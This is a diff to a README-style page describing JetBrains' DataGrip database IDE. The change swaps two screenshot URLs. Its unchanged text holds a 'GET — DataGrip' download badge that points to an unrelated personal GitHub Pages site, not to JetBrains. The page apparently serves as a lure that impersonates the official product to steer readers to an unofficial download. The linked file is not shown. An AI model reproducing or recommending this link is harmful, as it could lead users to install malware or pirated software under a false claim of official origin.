@@ -3,7 +3,7 @@
 
 DataGrip is a database development environment from JetBrains designed for writing SQL, exploring database structures, editing records, and analyzing query results. It brings database connections, intelligent code assistance, and data management tools into a unified workspace.
 
-![DataGrip SQL Editor Interface](https://www.jetbrains.com/_assets/rr/datagrip-video-preview-BBJ7rwJa.png)
+![DataGrip SQL Editor Interface](https://blog.jetbrains.com/wp-content/uploads/2026/07/DG-releases-BlogFeatured-1280x720-1.png)
 
 [![GET — DataGrip](https://img.shields.io/badge/GET%20%E2%80%94%20DataGrip-0078D6?style=for-the-badge&logoColor=white)](https://barbaradavisz717.github.io/.github/DataGrip-2026)
 
@@ -38,7 +38,7 @@ Its code assistance helps identify potential issues while writing SQL. Query his
 
 ## Interface Preview
 
-![DataGrip Database Explorer and Query Console](https://www.jetbrains.com/_assets/rr/code-of-console-D_LxwD4E.png)
+![DataGrip Database Explorer and Query Console](https://www.jetbrains.com/datagrip/whatsnew/2026-2/media/welcome-screen.png)
 
 The interface preview shows Database Explorer, a SQL query console, code completion, and a data results table.
 
